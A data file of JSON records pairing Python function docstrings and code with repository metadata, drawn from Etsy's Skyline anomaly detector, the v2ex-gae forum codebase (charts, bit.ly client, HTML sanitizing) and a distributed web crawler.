{"docstring": "\"\"\"\nA timeseries is anomalous if the average of the last three datapoints falls\ninto a histogram bin with less than 20 other datapoints (you'll need to tweak\nthat number depending on your data)\n\nReturns: the size of the bin which contains the tail_avg. Smaller bin size\nmeans more anomalous.\n\"\"\"\n\n", "func_signal": "def histogram_bins(timeseries):\n", "code": "series = scipy.array([x[1] for x in timeseries])\nt = tail_avg(timeseries)\nh = np.histogram(series, bins=15)\nbins = h[1]\nfor index, bin_size in enumerate(h[0]):\n    if bin_size <= 20:\n        # Is it in the first bin?\n        if index == 0:\n            if t <= bins[0]:\n                return True\n        # Is it in the current bin?\n        elif t >= bins[index] and t < bins[index + 1]:\n                return True\n\nreturn False", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if the deviation of its latest datapoint with\nrespect to the median is X times larger than the median of deviations.\n\"\"\"\n\n", "func_signal": "def median_absolute_deviation(timeseries):\n", "code": "series = pandas.Series([x[1] for x in timeseries])\nmedian = series.median()\ndemedianed = np.abs(series - median)\nmedian_deviation = demedianed.median()\n\n# The test statistic is infinite when the median is zero,\n# so it becomes super sensitive. We play it safe and skip when this happens.\nif median_deviation == 0:\n    return False\n\ntest_statistic = demedianed.iget(-1) / median_deviation\n\n# Completely arbitary...triggers if the median deviation is\n# 6 times bigger than the median\nif test_statistic > 6:\n    return True", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if the value of the next datapoint in the\nseries is farther than three standard deviations out in cumulative terms\nafter subtracting the mean from each data point.\n\"\"\"\n\n", "func_signal": "def mean_subtraction_cumulation(timeseries):\n", "code": "series = pandas.Series([x[1] if x[1] else 0 for x in timeseries])\nseries = series - series[0:len(series) - 1].mean()\nstdDev = series[0:len(series) - 1].std()\nexpAverage = pandas.stats.moments.ewma(series, com=15)\n\nreturn abs(series.iget(-1)) > 3 * stdDev", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nCalled when the process intializes.\n\"\"\"\n", "func_signal": "def run(self):\n", "code": "while 1:\n    now = time()\n\n    # Make sure Redis is up\n    try:\n        self.redis_conn.ping()\n    except:\n        logger.error('skyline can\\'t connect to redis at socket path %s' % settings.REDIS_SOCKET_PATH)\n        sleep(10)\n        self.redis_conn = StrictRedis(unix_socket_path = settings.REDIS_SOCKET_PATH)\n        continue\n\n    # Discover unique metrics\n    unique_metrics = list(self.redis_conn.smembers(settings.FULL_NAMESPACE + 'unique_metrics'))\n\n    if len(unique_metrics) == 0:\n        logger.info('no metrics in redis. try adding some - see README')\n        sleep(10)\n        continue\n\n    # Spawn processes\n    pids = []\n    for i in range(1, settings.ANALYZER_PROCESSES + 1):\n        if i > len(unique_metrics):\n            logger.info('WARNING: skyline is set for more cores than needed.')\n            break\n\n        p = Process(target=self.spin_process, args=(i, unique_metrics))\n        pids.append(p)\n        p.start()\n\n    # Send wait signal to zombie processes\n    for p in pids:\n        p.join()\n\n    # Grab data from the queue and populate dictionaries\n    exceptions = dict()\n    anomaly_breakdown = dict()\n    while 1:\n        try:\n            key, value = self.anomaly_breakdown_q.get_nowait()\n            if key not in anomaly_breakdown.keys():\n                anomaly_breakdown[key] = value\n            else:\n                anomaly_breakdown[key] += value\n        except Empty:\n            break\n\n    while 1:\n        try:\n            key, value = self.exceptions_q.get_nowait()\n            if key not in exceptions.keys():\n                exceptions[key] = value\n            else:\n                exceptions[key] += value\n        except Empty:\n            break\n\n    # Send alerts\n    if settings.ENABLE_ALERTS:\n        for alert in settings.ALERTS:\n            for metric in self.anomalous_metrics:\n                if alert[0] in metric[1]:\n                    cache_key = 'last_alert.%s.%s' % (alert[1], metric[1])\n                    try:\n                        last_alert = self.redis_conn.get(cache_key)\n                        if not last_alert:\n                            self.redis_conn.setex(cache_key, alert[2], packb(metric[0]))\n                            trigger_alert(alert, metric)\n\n                    except Exception as e:\n                        logger.error(\"couldn't send alert: %s\" % e)\n\n    # Write anomalous_metrics to static webapp directory\n    filename = path.abspath(path.join(path.dirname(__file__), '..', settings.ANOMALY_DUMP))\n    with open(filename, 'w') as fh:\n        # Make it JSONP with a handle_data() function\n        anomalous_metrics = list(self.anomalous_metrics)\n        anomalous_metrics.sort(key=operator.itemgetter(1))\n        fh.write('handle_data(%s)' % anomalous_metrics)\n\n    # Log progress\n    logger.info('seconds to run    :: %.2f' % (time() - now))\n    logger.info('total metrics     :: %d' % len(unique_metrics))\n    logger.info('total analyzed    :: %d' % (len(unique_metrics) - sum(exceptions.values())))\n    logger.info('total anomalies   :: %d' % len(self.anomalous_metrics))\n    logger.info('exception stats   :: %s' % exceptions)\n    logger.info('anomaly breakdown :: %s' % anomaly_breakdown)\n\n    # Log to Graphite\n    self.send_graphite_metric('skyline.analyzer.run_time', '%.2f' % (time() - now))\n    self.send_graphite_metric('skyline.analyzer.total_analyzed', '%.2f' % (len(unique_metrics) - sum(exceptions.values())))\n\n    # Check canary metric\n    raw_series = self.redis_conn.get(settings.FULL_NAMESPACE + settings.CANARY_METRIC)\n    if raw_series is not None:\n        unpacker = Unpacker(use_list = False)\n        unpacker.feed(raw_series)\n        timeseries = list(unpacker)\n        time_human = (timeseries[-1][0] - timeseries[0][0]) / 3600\n        projected = 24 * (time() - now) / time_human\n\n        logger.info('canary duration   :: %.2f' % time_human)\n        self.send_graphite_metric('skyline.analyzer.duration', '%.2f' % time_human)\n        self.send_graphite_metric('skyline.analyzer.projected', '%.2f' % projected)\n\n    # Reset counters\n    self.anomalous_metrics[:] = []\n\n    # Sleep if it went too fast\n    if time() - now < 5:\n        logger.info('sleeping due to low run time...')\n        sleep(10)", "path": "skyline/src/analyzer/analyzer.py", "commit_date": "2013-12-04 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nThis is a utility function used to calculate the average of the last three\ndatapoints in the series as a measure, instead of just the last datapoint.\nIt reduces noise, but it also reduces sensitivity and increases the delay\nto detection.\n\"\"\"\n", "func_signal": "def tail_avg(timeseries):\n", "code": "try:\n    t = (timeseries[-1][1] + timeseries[-2][1] + timeseries[-3][1]) / 3\n    return t\nexcept IndexError:\n    return timeseries[-1][1]", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nGenerate a pickle from a stream\n\"\"\"\n", "func_signal": "def gen_unpickle(self, infile):\n", "code": "try:\n    bunch = self.unpickler.loads(infile)\n    yield bunch\nexcept EOFError:\n    return", "path": "skyline/src/horizon/listen.py", "commit_date": "2014-06-19 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nCalcuate the simple average over one hour, FULL_DURATION seconds ago.\nA timeseries is anomalous if the average of the last three datapoints\nare outside of three standard deviations of this value.\n\"\"\"\n", "func_signal": "def first_hour_average(timeseries):\n", "code": "last_hour_threshold = time() - (FULL_DURATION - 3600)\nseries = pandas.Series([x[1] for x in timeseries if x[0] < last_hour_threshold])\nmean = (series).mean()\nstdDev = (series).std()\nt = tail_avg(timeseries)\n\nreturn abs(t - mean) > 3 * stdDev", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if the average of the last three datapoints\non a projected least squares model is greater than three sigma.\n\"\"\"\n\n", "func_signal": "def least_squares(timeseries):\n", "code": "x = np.array([t[0] for t in timeseries])\ny = np.array([t[1] for t in timeseries])\nA = np.vstack([x, np.ones(len(x))]).T\nresults = np.linalg.lstsq(A, y)\nresidual = results[1]\nm, c = np.linalg.lstsq(A, y)[0]\nerrors = []\nfor i, value in enumerate(y):\n    projected = m * x[i] + c\n    error = value - projected\n    errors.append(error)\n\nif len(errors) < 3:\n    return False\n\nstd_dev = scipy.std(errors)\nt = (errors[-1] + errors[-2] + errors[-3]) / 3\n\nreturn abs(t) > std_dev * 3 and round(std_dev) != 0 and round(t) != 0", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nSelf explanatory\n\"\"\"\n", "func_signal": "def check_if_parent_is_alive(self):\n", "code": "try:\n    kill(self.current_pid, 0)\n    kill(self.parent_pid, 0)\nexcept:\n    exit(0)", "path": "skyline/src/horizon/listen.py", "commit_date": "2014-06-19 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nA timeseries is anomalous if the absolute value of the average of the latest\nthree datapoint minus the moving average is greater than three standard\ndeviations of the average. This does not exponentially weight the MA and so\nis better for detecting anomalies with respect to the entire series.\n\"\"\"\n", "func_signal": "def stddev_from_average(timeseries):\n", "code": "series = pandas.Series([x[1] for x in timeseries])\nmean = series.mean()\nstdDev = series.std()\nt = tail_avg(timeseries)\n\nreturn abs(t - mean) > 3 * stdDev", "path": "skyline/src/analyzer/algorithms.py", "commit_date": "2014-05-02 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nCalled when process intializes.\n\"\"\"\n", "func_signal": "def run(self):\n", "code": "logger.info('started listener')\n\nif self.type == 'pickle':\n    self.listen_pickle()\nelif self.type == 'udp':\n    self.listen_udp()\nelse:\n    logging.error('unknown listener format')", "path": "skyline/src/horizon/listen.py", "commit_date": "2014-06-19 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"\nSelf explanatory\n\"\"\"\n", "func_signal": "def check_if_parent_is_alive(self):\n", "code": "try:\n    kill(self.current_pid, 0)\n    kill(self.parent_pid, 0)\nexcept:\n    exit(0)", "path": "skyline/src/analyzer/analyzer.py", "commit_date": "2013-12-04 00:00:00", "repo_name": "etsy/skyline", "stars": 2130, "license": "other", "language": "python", "size": 1878}
{"docstring": "\"\"\"Constructor for PieChart objects.\n\nCreates a pie chart with a single pie.\n\nArgs:\n  points: A list of data points for the pie chart;\n          i.e., relative sizes of the pie segments\n  labels: A list of labels for the pie segments.\n          TODO: Allow the user to pass in None as one of\n          the labels in order to skip that label.\n  colors: A list of colors for the pie segments, as hex strings\n          (f.ex. '0000ff' for blue). If there are less colors than pie\n          segments, the Google Chart API will attempt to produce a smooth\n          color transition between segments by spreading the colors across\n          them.\n\"\"\"\n", "func_signal": "def __init__(self, points=None, labels=None, colors=None):\n", "code": "super(PieChart, self).__init__()\nself.formatters = []\nself._colors = None\nif points:\n  self.AddPie(points, labels, colors)", "path": "v2ex-gae/mapreduce/lib/graphy/pie_chart.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Get a TreeWalker class for various types of tree with built-in support\n\ntreeType - the name of the tree type required (case-insensitive). Supported\n           values are \"simpletree\", \"dom\", \"etree\" and \"beautifulsoup\"\n\n           \"simpletree\" - a built-in DOM-ish tree type with support for some\n                          more pythonic idioms.\n            \"dom\" - The xml.dom.minidom DOM implementation\n            \"pulldom\" - The xml.dom.pulldom event stream\n            \"etree\" - A generic walker for tree implementations exposing an\n                      elementtree-like interface (known to work with\n                      ElementTree, cElementTree and lxml.etree).\n            \"lxml\" - Optimized walker for lxml.etree\n            \"beautifulsoup\" - Beautiful soup (if installed)\n            \"genshi\" - a Genshi stream\n\nimplementation - (Currently applies to the \"etree\" tree type only). A module\n                  implementing the tree type e.g. xml.etree.ElementTree or\n                  cElementTree.\"\"\"\n\n", "func_signal": "def getTreeWalker(treeType, implementation=None, **kwargs):\n", "code": "treeType = treeType.lower()\nif treeType not in treeWalkerCache:\n    if treeType in (\"dom\", \"pulldom\", \"simpletree\"):\n        mod = __import__(treeType, globals())\n        treeWalkerCache[treeType] = mod.TreeWalker\n    elif treeType == \"genshi\":\n        import genshistream\n        treeWalkerCache[treeType] = genshistream.TreeWalker\n    elif treeType == \"beautifulsoup\":\n        import soup\n        treeWalkerCache[treeType] = soup.TreeWalker\n    elif treeType == \"lxml\":\n        import lxmletree\n        treeWalkerCache[treeType] = lxmletree.TreeWalker\n    elif treeType == \"etree\":\n        import etree\n        # XXX: NEVER cache here, caching is done in the etree submodule\n        return etree.getETreeModule(implementation, **kwargs).TreeWalker\nreturn treeWalkerCache.get(treeType)", "path": "v2ex-gae/html5lib/treewalkers/__init__.py", "commit_date": "2012-03-20 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Automatically fill out the legend based on series labels.  This will only\nfill out the legend if is at least one series with a label.\n\"\"\"\n", "func_signal": "def AutoLegend(chart):\n", "code": "chart._show_legend = False\nlabels = []\nfor series in chart.data:\n  if series.label is None:\n    labels.append('')\n  else:\n    labels.append(series.label)\n    chart._show_legend = True\nif chart._show_legend:\n  chart._legend_labels = labels", "path": "v2ex-gae/mapreduce/lib/graphy/formatters.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\" Given a bit.ly url or hash, return long source url \"\"\"\n", "func_signal": "def expand(self,shortURL):\n", "code": "request = self._getURL(\"expand\",shortURL)\nresult = self._fetchUrl(request)\njson = simplejson.loads(result)\nself._CheckForError(json)\nreturn json['results'][string.split(shortURL, '/')[-1]]['longUrl']", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "'''Create a new instance based on a JSON dict.\n    \nArgs:\n  data: A JSON dict, as converted from the JSON in the bitly API\nReturns:\n  A bitly.Stats instance\n'''\n", "func_signal": "def NewFromJsonDict(data):\n", "code": "return Stats(user_clicks=data.get('userClicks', None),\n              total_clicks=data.get('clicks', None))", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Provide a legend for line charts by attaching labels to the right\nend of each line.  Supresses the regular legend.\n\"\"\"\n", "func_signal": "def InlineLegend(chart):\n", "code": "show = False\nlabels = []\nlabel_positions = []\nfor series in chart.data:\n  if series.label is None:\n    labels.append('')\n  else:\n    labels.append(series.label)\n    show = True\n  label_positions.append(series.data[-1])\n\nif show:\n  chart.right.min = chart.left.min\n  chart.right.max = chart.left.max\n  chart.right.labels = labels\n  chart.right.label_positions = label_positions\n  chart._show_legend = False  # Supress the regular legend.", "path": "v2ex-gae/mapreduce/lib/graphy/formatters.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Strips wrapping parentheses.\n\nReturns a tuple of the following format::\n\n    (string stripped from wrapping parentheses,\n     count of stripped opening parentheses,\n     count of stripped closing parentheses)\n\"\"\"\n", "func_signal": "def strip_wrapping_parentheses(fragment):\n", "code": "opening_parentheses = closing_parentheses = 0\n# Count consecutive opening parentheses\n# at the beginning of the fragment (string).\nfor char in fragment:\n    if char == '(':\n        opening_parentheses += 1\n    else:\n        break\n\nif opening_parentheses:\n    newer_frag = ''\n    # Cut the consecutive opening brackets from the fragment.\n    fragment = fragment[opening_parentheses:]\n    # Reverse the fragment for easier detection of parentheses\n    # inside the URL.\n    reverse_fragment = fragment[::-1]\n    skip = False\n    for char in reverse_fragment:\n        # Remove the closing parentheses if it has a matching\n        # opening parentheses (they are balanced).\n        if (char == ')' and\n                closing_parentheses < opening_parentheses and\n                not skip):\n            closing_parentheses += 1\n            continue\n        # Do not remove ')' from the URL itself.\n        elif char != ')':\n            skip = True\n        newer_frag += char\n    fragment = newer_frag[::-1]\n\nreturn fragment, opening_parentheses, closing_parentheses", "path": "v2ex-gae/v2ex/babel/ext/bleach/__init__.py", "commit_date": "2012-03-20 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Get a TreeBuilder class for various types of tree with built-in support\n\ntreeType - the name of the tree type required (case-insensitive). Supported\n           values are \"simpletree\", \"dom\", \"etree\" and \"beautifulsoup\"\n           \n           \"simpletree\" - a built-in DOM-ish tree type with support for some\n                          more pythonic idioms.\n            \"dom\" - A generic builder for DOM implementations, defaulting to\n                    a xml.dom.minidom based implementation for the sake of\n                    backwards compatibility (as releases up until 0.10 had a\n                    builder called \"dom\" that was a minidom implemenation).\n            \"etree\" - A generic builder for tree implementations exposing an\n                      elementtree-like interface (known to work with\n                      ElementTree, cElementTree and lxml.etree).\n            \"beautifulsoup\" - Beautiful soup (if installed)\n           \nimplementation - (Currently applies to the \"etree\" and \"dom\" tree types). A\n                  module implementing the tree type e.g.\n                  xml.etree.ElementTree or lxml.etree.\"\"\"\n\n", "func_signal": "def getTreeBuilder(treeType, implementation=None, **kwargs):\n", "code": "treeType = treeType.lower()\nif treeType not in treeBuilderCache:\n    if treeType == \"dom\":\n        import dom\n        # XXX: Keep backwards compatibility by using minidom if no implementation is given\n        if implementation == None:\n            from xml.dom import minidom\n            implementation = minidom\n        # XXX: NEVER cache here, caching is done in the dom submodule\n        return dom.getDomModule(implementation, **kwargs).TreeBuilder\n    elif treeType == \"simpletree\":\n        import simpletree\n        treeBuilderCache[treeType] = simpletree.TreeBuilder\n    elif treeType == \"beautifulsoup\":\n        import soup\n        treeBuilderCache[treeType] = soup.TreeBuilder\n    elif treeType == \"lxml\":\n        import etree_lxml\n        treeBuilderCache[treeType] = etree_lxml.TreeBuilder\n    elif treeType == \"etree\":\n        # Come up with a sane default\n        if implementation == None:\n            try:\n                import xml.etree.cElementTree as ET\n            except ImportError:\n                try:\n                    import xml.etree.ElementTree as ET\n                except ImportError:\n                    try:\n                        import cElementTree as ET\n                    except ImportError:\n                        import elementtree.ElementTree as ET\n            implementation = ET\n        import etree\n        # NEVER cache here, caching is done in the etree submodule\n        return etree.getETreeModule(implementation, **kwargs).TreeBuilder\n    else:\n        raise ValueError(\"\"\"Unrecognised treebuilder \"%s\" \"\"\"%treeType)\nreturn treeBuilderCache.get(treeType)", "path": "v2ex-gae/html5lib/treebuilders/__init__.py", "commit_date": "2012-03-20 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"DEPRECATED\n\nAdd a new segment to the chart and return it.\n\nThe segment must contain exactly one data point; all parameters\nother than color and label are ignored.\n\"\"\"\n", "func_signal": "def AddSeries(self, points, color=None, style=None, markers=None, label=None):\n", "code": "warnings.warn('PieChart.AddSeries is deprecated.  Call AddSegment or '\n              'AddSegments instead.', DeprecationWarning)\nreturn self.AddSegment(Segment(points[0], color=color, label=label))", "path": "v2ex-gae/mapreduce/lib/graphy/pie_chart.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Add a pie segment to this chart, and return the segment.\n\nsize: The size of the segment.\nlabel: The label for the segment.\ncolor: The color of the segment, or None to automatically choose the color.\npie_index: The index of the pie that will receive the new segment.\n  By default, the chart has one pie (pie #0); use the AddPie method to\n  add more pies.\n\"\"\"\n", "func_signal": "def AddSegment(self, size, label=None, color=None, pie_index=0):\n", "code": "if isinstance(size, Segment):\n  warnings.warn(\"AddSegment(segment) is deprecated.  Use AddSegment(size, \"\n                \"label, color) instead\",  DeprecationWarning, stacklevel=2)\n  segment = size\nelse:\n  segment = Segment(size, label=label, color=color)\nassert segment.size >= 0\nif pie_index == 0 and not self.data:\n  # Create the default pie\n  self.data.append([])\nassert (pie_index >= 0 and pie_index < len(self.data))\nself.data[pie_index].append(segment)\nreturn segment", "path": "v2ex-gae/mapreduce/lib/graphy/pie_chart.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\" \n    Takes either:\n    A long URL string and returns shortened URL string\n    Or a list of long URL strings and returns a list of shortened URL strings.\n\"\"\"\n", "func_signal": "def shorten(self,longURL):\n", "code": "if not isinstance(longURL, list):\n    longURL = [longURL]\n\nfor index,url in enumerate(longURL):\n    if not '://' in url:\n        longURL[index] = \"http://\" + url\n    \nrequest = self._getURL(\"shorten\",longURL)\nresult = self._fetchUrl(request)\njson = simplejson.loads(result)\nself._CheckForError(json)\n\nres = []\nfor item in json['results'].values():\n    if item['shortKeywordUrl'] == \"\":\n        res.append(item['shortUrl'])\n    else:\n        res.append(item['shortKeywordUrl'])\n\nif len(res) == 1:\n    return res[0]\nelse:\n    return res", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\" \nGiven a bit.ly url or hash, \nreturn information about that page, \nsuch as the long source url\n\"\"\"\n", "func_signal": "def info(self,shortURL):\n", "code": "request = self._getURL(\"info\",shortURL)\nresult = self._fetchUrl(request)\njson = simplejson.loads(result)\nself._CheckForError(json)\nreturn json['results'][string.split(shortURL, '/')[-1]]", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Format the chart by setting the min/max values on its dependent axis.\"\"\"\n", "func_signal": "def __call__(self, chart):\n", "code": "if not chart.data:\n  return # Nothing to do.\nmin_value, max_value = chart.GetMinMaxValues()\nif None in (min_value, max_value):\n  return  # No data.  Nothing to do.\n\n# Honor user's choice, if they've picked min/max.\nfor axis in chart.GetDependentAxes():\n  if axis.min is not None:\n    min_value = axis.min\n  if axis.max is not None:\n    max_value = axis.max\n\nbuffer = (max_value - min_value) * self.buffer  # Stay away from edge.\n\nfor axis in chart.GetDependentAxes():\n  if axis.min is None:\n    axis.min = min_value - buffer\n  if axis.max is None:\n    axis.max = max_value + buffer", "path": "v2ex-gae/mapreduce/lib/graphy/formatters.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Remove links from text, except those allowed to stay.\"\"\"\n", "func_signal": "def delinkify(text, allow_domains=None, allow_relative=False):\n", "code": "text = force_unicode(text)\nif not text:\n    return u''\n\nparser = html5lib.HTMLParser(tokenizer=HTMLSanitizer)\nforest = parser.parseFragment(text)\n\nif allow_domains is None:\n    allow_domains = []\nelif isinstance(allow_domains, basestring):\n    allow_domains = [allow_domains]\n\ndef delinkify_nodes(tree):\n    \"\"\"Remove <a> tags and replace them with their contents.\"\"\"\n    for node in tree.childNodes:\n        if node.name == 'a':\n            if 'href' not in node.attributes:\n                continue\n            parts = urlparse.urlparse(node.attributes['href'])\n            host = parts.hostname\n            if any(_domain_match(host, d) for d in allow_domains):\n                continue\n            if host is None and allow_relative:\n                continue\n            # Replace the node with its children.\n            # You can't nest <a> tags, and html5lib takes care of that\n            # for us in the tree-building step.\n            for n in node.childNodes:\n                tree.insertBefore(n, node)\n            tree.removeChild(node)\n        elif node.type != NODE_TEXT: # Don't try to delinkify text.\n            delinkify_nodes(node)\n\ndelinkify_nodes(forest)\nreturn _render(forest)", "path": "v2ex-gae/v2ex/babel/ext/bleach/__init__.py", "commit_date": "2012-03-20 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "'''Fetch a URL\n    \nArgs:\n  url: The URL to retrieve\n    \nReturns:\n  A string containing the body of the response.\n'''\n    \n# Open and return the URL \n", "func_signal": "def _fetchUrl(self,url):\n", "code": "url_data = self._urllib.urlopen(url).read()\nreturn url_data", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Create a factory method for instantiating charts with displays.\n\nReturns a method which, when called, will create & return a chart with\nchart.display already populated.\n\"\"\"\n", "func_signal": "def _GetChartFactory(chart_class, display_class):\n", "code": "def Inner(*args, **kwargs):\n  chart = chart_class(*args, **kwargs)\n  chart.display = display_class(chart)\n  return chart\nreturn Inner", "path": "v2ex-gae/mapreduce/lib/graphy/backends/google_chart_api/__init__.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"DEPRECATED.\"\"\"\n", "func_signal": "def AddSegments(self, points, labels, colors):\n", "code": "warnings.warn('PieChart.AddSegments is deprecated. Call AddPie instead. ',\n              DeprecationWarning, stacklevel=2)\nnum_colors = len(colors or [])\nfor i, pt in enumerate(points):\n  assert pt >= 0\n  label = labels[i]\n  color = None\n  if i < num_colors:\n    color = colors[i]\n  self.AddSegment(pt, label=label, color=color)", "path": "v2ex-gae/mapreduce/lib/graphy/pie_chart.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\" Given a bit.ly url or hash, return traffic and referrer data.  \"\"\"\n", "func_signal": "def stats(self,shortURL):\n", "code": "request = self._getURL(\"stats\",shortURL)\nresult = self._fetchUrl(request)\njson = simplejson.loads(result)\nself._CheckForError(json)\nreturn Stats.NewFromJsonDict(json['results'])", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\" Get a list of bit.ly API error codes. \"\"\"\n", "func_signal": "def errors(self):\n", "code": "request = self._getURL(\"errors\",\"\")\nresult = self._fetchUrl(request)\njson = simplejson.loads(result)\nself._CheckForError(json)\nreturn json['results']", "path": "v2ex-gae/twitter/bitly.py", "commit_date": "2010-07-22 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Add a whole pie to the chart.\n\nArgs:\n  points: A list of pie segment sizes\n  labels: A list of labels for the pie segments\n  colors: A list of colors for the segments. Missing colors will be chosen\n      automatically.\nReturn:\n  The index of the newly added pie.\n\"\"\"\n", "func_signal": "def AddPie(self, points, labels=None, colors=None):\n", "code": "num_colors = len(colors or [])\nnum_labels = len(labels or [])\npie_index = len(self.data)\nself.data.append([])\nfor i, pt in enumerate(points):\n  label = None\n  if i < num_labels:\n    label = labels[i]\n  color = None\n  if i < num_colors:\n    color = colors[i]\n  self.AddSegment(pt, label=label, color=color, pie_index=pie_index)\nreturn pie_index", "path": "v2ex-gae/mapreduce/lib/graphy/pie_chart.py", "commit_date": "2010-11-28 00:00:00", "repo_name": "livid/v2ex-gae", "stars": 3091, "license": "bsd-3-clause", "language": "python", "size": 1511}
{"docstring": "\"\"\"Pop a request\"\"\"\n# use atomic range/remove using multi/exec\n", "func_signal": "def pop(self):\n", "code": "pipe = self.server.pipeline()\npipe.multi()\npipe.zrange(self.key, 0, 0).zremrangebyrank(self.key, 0, 0)\nresults, count = pipe.execute()\nif results:\n    return self._decode_request(results[0])", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/queue.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"Push a request\"\"\"\n", "func_signal": "def push(self, request):\n", "code": "data = self._encode_request(request)\npairs = {data:-request.priority}\nself.server.zadd(self.key, **pairs)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/queue.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    return the SHA1 hash of the file url\n\"\"\"\n\n", "func_signal": "def file_key(self, url):\n", "code": "file_guid = hashlib.sha1(url).hexdigest()\nreturn '%s/%s' % (urlparse(url).netloc,file_guid)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/pipelines/file.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    Decompression_zip\n\"\"\"\n", "func_signal": "def Decompression_zip(specific_file):\n", "code": "if zipfile.is_zipfile(specific_file):\n    try:\n        zipfile.ZipFile(specific_file).extractall(os.path.split(specific_file)[0])\n    except Exception as err:\n        traceback.print_exc()", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/commands/decomperssion.py", "commit_date": "2013-04-25 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
